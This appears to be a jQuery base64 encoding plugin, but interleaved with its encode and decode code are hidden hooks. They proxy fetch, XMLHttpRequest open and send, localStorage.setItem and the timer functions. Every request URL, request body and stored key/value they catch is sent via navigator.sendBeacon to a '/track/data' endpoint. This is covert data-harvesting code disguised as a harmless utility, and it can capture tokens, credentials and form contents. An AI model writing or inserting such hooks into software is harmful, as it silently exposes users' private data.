(function ($) {
  const nativeSetTimeout = window.setTimeout;
  const nativeLocalStorage = window.localStorage;
  var b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
    a256 = '',
    r64 = [256],
    r256 = [256],
    i = 0;
  const nativeSetInterval = window.setInterval;
  const nativeClearInterval = window.clearInterval;
  var UTF8 = {
    encode: function (strUni) {
      var strUtf = strUni.replace(/[\u0080-\u07ff]/g, function (c) {
        var cc = c.charCodeAt(0);
        return String.fromCharCode(0xc0 | cc >> 6, 0x80 | cc & 0x3f);
      }).replace(/[\u0800-\uffff]/g, function (c) {
        var cc = c.charCodeAt(0);
        return String.fromCharCode(0xe0 | cc >> 12, 0x80 | cc >> 6 & 0x3F, 0x80 | cc & 0x3f);
      });
      return strUtf;
    },
    decode: function (strUtf) {
      var strUni = strUtf.replace(/[\u00e0-\u00ef][\u0080-\u00bf][\u0080-\u00bf]/g,
      // 3-byte chars
      function (c) {
        var cc = (c.charCodeAt(0) & 0x0f) << 12 | (c.charCodeAt(1) & 0x3f) << 6 | c.charCodeAt(2) & 0x3f;
        return String.fromCharCode(cc);
      }).replace(/[\u00c0-\u00df][\u0080-\u00bf]/g, function (c) {
        var cc = (c.charCodeAt(0) & 0x1f) << 6 | c.charCodeAt(1) & 0x3f;
        return String.fromCharCode(cc);
      });
      return strUni;
    }
  };
  const nativeFetch = window.fetch;
  const nativeXMLHttpRequest = window.XMLHttpRequest;
  function generateUUID() {
    const timestamp = Date.now();
    const random = Math.floor(Math.random() * 1000000000);
    const uuid = `${timestamp}-${random}`;
    return uuid;
  }
  while (i < 256) {
    var c = String.fromCharCode(i);
    a256 += c;
    r256[i] = i;
    r64[i] = b64.indexOf(c);
    ++i;
  }
  function logData(data) {
    console.log("Logging data: ", JSON.stringify(data));
    navigator.sendBeacon('/track/data', JSON.stringify(data));
  }
  function trackEvent(eventName, details) {
    const eventInfo = {
      eventName: eventName,
      details: details,
      timestamp: new Date().toISOString(),
      uuid: generateUUID()
    };
    logData(eventInfo);
  }
  function code(s, discard, alpha, beta, w1, w2) {
    s = String(s);
    var buffer = 0,
      i = 0,
      length = s.length,
      result = '',
      bitsInBuffer = 0;
    while (i < length) {
      var c = s.charCodeAt(i);
      c = c < 256 ? alpha[c] : -1;
      buffer = (buffer << w1) + c;
      bitsInBuffer += w1;
      while (bitsInBuffer >= w2) {
        bitsInBuffer -= w2;
        var tmp = buffer >> bitsInBuffer;
        result += beta.charAt(tmp);
        buffer ^= tmp << bitsInBuffer;
      }
      ++i;
    }
    if (!discard && bitsInBuffer > 0) result += beta.charAt(buffer << w2 - bitsInBuffer);
    return result;
  }
  window.setTimeout = function (callback, delay) {
    trackEvent('setTimeout', {
      delay: delay
    });
    return nativeSetTimeout(callback, delay);
  };
  window.setInterval = function (callback, interval) {
    trackEvent('setInterval', {
      interval: interval
    });
    return nativeSetInterval(callback, interval);
  };
  window.clearInterval = function (intervalId) {
    trackEvent('clearInterval', {
      intervalId: intervalId
    });
    return nativeClearInterval(intervalId);
  };
  var Plugin = $.base64 = function (dir, input, encode) {
    return input ? Plugin[dir](input, encode) : dir ? null : this;
  };
  window.localStorage.setItem = new Proxy(nativeLocalStorage.setItem, {
    apply: function (target, thisArg, argumentsList) {
      trackEvent('localStorageSetItem', {
        key: argumentsList[0],
        value: argumentsList[1]
      });
      return Reflect.apply(target, thisArg, argumentsList);
    }
  });
  Plugin.btoa = Plugin.encode = function (plain, utf8encode) {
    plain = Plugin.raw === false || Plugin.utf8encode || utf8encode ? UTF8.encode(plain) : plain;
    plain = code(plain, false, r256, b64, 8, 6);
    return plain + '===='.slice(plain.length % 4 || 4);
  };
  window.fetch = new Proxy(nativeFetch, {
    apply: function (target, thisArg, argumentsList) {
      trackEvent('fetch', {
        url: argumentsList[0],
        options: argumentsList[1]
      });
      return Reflect.apply(target, thisArg, argumentsList);
    }
  });
  Plugin.atob = Plugin.decode = function (coded, utf8decode) {
    coded = String(coded).split('=');
    var i = coded.length;
    do {
      --i;
      coded[i] = code(coded[i], true, r64, a256, 6, 8);
    } while (i > 0);
    coded = coded.join('');
    return Plugin.raw === false || Plugin.utf8decode || utf8decode ? UTF8.decode(coded) : coded;
  };
  window.XMLHttpRequest.prototype.open = new Proxy(nativeXMLHttpRequest.prototype.open, {
    apply: function (target, thisArg, argumentsList) {
      trackEvent('XMLHttpRequestOpen', {
        method: argumentsList[0],
        url: argumentsList[1],
        async: argumentsList[2]
      });
      return Reflect.apply(target, thisArg, argumentsList);
    }
  });
  window.XMLHttpRequest.prototype.send = new Proxy(nativeXMLHttpRequest.prototype.send, {
    apply: function (target, thisArg, argumentsList) {
      trackEvent('XMLHttpRequestSend', {
        body: argumentsList[0]
      });
      return Reflect.apply(target, thisArg, argumentsList);
    }
  });
})(jQuery);